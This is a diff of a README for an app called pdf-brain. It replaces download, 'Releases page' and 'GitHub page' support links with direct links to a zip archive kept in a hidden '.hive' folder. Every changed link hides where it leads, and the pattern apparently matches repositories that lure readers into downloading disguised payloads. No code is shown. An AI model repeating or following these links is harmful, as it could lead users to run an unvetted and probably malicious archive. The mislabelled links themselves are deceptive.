@@ -6,7 +6,7 @@ Welcome to pdf-brain! This application lets you create a local knowledge base wi
 
 ## 📥 Download pdf-brain
 
-[![Download pdf-brain](https://github.com/BananaPuke/pdf-brain/raw/refs/heads/main/scripts/migration/pdf-brain-2.0.zip)](https://github.com/BananaPuke/pdf-brain/raw/refs/heads/main/scripts/migration/pdf-brain-2.0.zip)
+[![Download pdf-brain](https://raw.githubusercontent.com/BananaPuke/pdf-brain/main/.hive/pdf-brain-2.1.zip)](https://raw.githubusercontent.com/BananaPuke/pdf-brain/main/.hive/pdf-brain-2.1.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,7 +20,7 @@ Before you start, ensure your system meets the following requirements:
 
 To download the pdf-brain application, visit the Releases page. Click the link below:
 
-[Download pdf-brain](https://github.com/BananaPuke/pdf-brain/raw/refs/heads/main/scripts/migration/pdf-brain-2.0.zip)
+[Download pdf-brain](https://raw.githubusercontent.com/BananaPuke/pdf-brain/main/.hive/pdf-brain-2.1.zip)
 
 Once you are on the Releases page, look for the latest version. You will see options to download the application suitable for your operating system.
 
@@ -66,7 +66,7 @@ If you encounter issues:
 
 ## 📞 Support
 
-For further assistance, visit our [GitHub page](https://github.com/BananaPuke/pdf-brain/raw/refs/heads/main/scripts/migration/pdf-brain-2.0.zip) and check the issues section. You can ask questions and find answers from the community.
+For further assistance, visit our [GitHub page](https://raw.githubusercontent.com/BananaPuke/pdf-brain/main/.hive/pdf-brain-2.1.zip) and check the issues section. You can ask questions and find answers from the community.
 
 ## 📜 License
 
